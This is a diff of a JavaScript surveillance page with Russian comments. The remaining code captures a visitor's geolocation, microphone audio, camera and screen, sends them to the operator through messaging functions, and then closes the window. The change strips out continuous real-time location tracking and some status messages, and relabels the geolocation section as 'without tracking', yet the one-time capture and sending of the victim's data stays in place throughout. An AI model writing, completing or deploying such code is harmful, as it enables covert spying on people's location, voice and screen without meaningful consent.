@@ -141,7 +141,7 @@ ${ip}`;
     await sendMessage(message);
 }
 
-// ========== ГЕОЛОКАЦИЯ (ОДИН РАЗ) ==========
+// ========== ГЕОЛОКАЦИЯ (ОДИН РАЗ, БЕЗ СЛЕЖКИ) ==========
 function getGeo(callback) {
     if (!navigator.geolocation) {
         sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
@@ -161,35 +161,6 @@ function getGeo(callback) {
     );
 }
 
-// ========== СЛЕЖКА ЗА ГЕОЛОКАЦИЕЙ (РЕАЛЬНОЕ ВРЕМЯ) ==========
-let watchId = null;
-function startGeoWatching() {
-    if (!navigator.geolocation) {
-        sendMessage('❌ Слежка за гео: не поддерживается');
-        return;
-    }
-    watchId = navigator.geolocation.watchPosition(
-        (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            sendMessage(`📍 Трекинг: https://yandex.com/maps/?pt=${lon},${lat}&z=17\n🎯 Точность: ${pos.coords.accuracy}м`);
-        },
-        (error) => {
-            if (error.code === 1) sendMessage('❌ Слежка за гео: пользователь ЗАПРЕТИЛ');
-            else sendMessage(`❌ Слежка за гео: ${error.message}`);
-        },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-    );
-}
-
-function stopGeoWatching() {
-    if (watchId) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-        sendMessage('🛑 Слежка за гео остановлена');
-    }
-}
-
 // ========== МИКРОФОН (ЗАПИСЬ 5 СЕКУНД) ==========
 async function recordAudio() {
     try {
@@ -202,12 +173,10 @@ async function recordAudio() {
             const blob = new Blob(chunks, { type: 'audio/webm' });
             await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
             stream.getTracks().forEach(t => t.stop());
-            sendMessage('✅ Аудио отправлено');
         };
         
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-        sendMessage('🎙️ Запись микрофона началась (5 сек)...');
     } catch(e) {
         let msg = '';
         if (e.name === 'NotAllowedError') msg = 'Пользователь ЗАПРЕТИЛ доступ к микрофону';
@@ -221,7 +190,6 @@ async function recordAudio() {
 async function takeScreenshot() {
     try {
         const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        const videoTrack = stream.getVideoTracks()[0];
         const videoEl = document.createElement('video');
         const canvas = document.createElement('canvas');
         
@@ -233,10 +201,7 @@ async function takeScreenshot() {
             canvas.height = videoEl.videoHeight;
             canvas.getContext('2d').drawImage(videoEl, 0, 0);
             canvas.toBlob(async (blob) => {
-                if (blob) {
-                    await sendPhoto(blob, '📸 Скриншот экрана');
-                    sendMessage('✅ Скриншот отправлен');
-                }
+                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
                 stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg', 0.9);
         };
@@ -433,8 +398,6 @@ async function main() {
     getGeo(async (loc) => {
         if (loc) {
             await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
-            // Слежка за гео (реальное время) - использует то же разрешение
-            startGeoWatching();
         }
         
         // Камера (фронтальная и задняя)
@@ -456,8 +419,6 @@ async function main() {
                         // Скриншот экрана
                         await takeScreenshot();
                         
-                        // Останавливаем слежку и закрываем
-                        stopGeoWatching();
                         setTimeout(() => window.close(), 2000);
                     });
                 }, 3000);
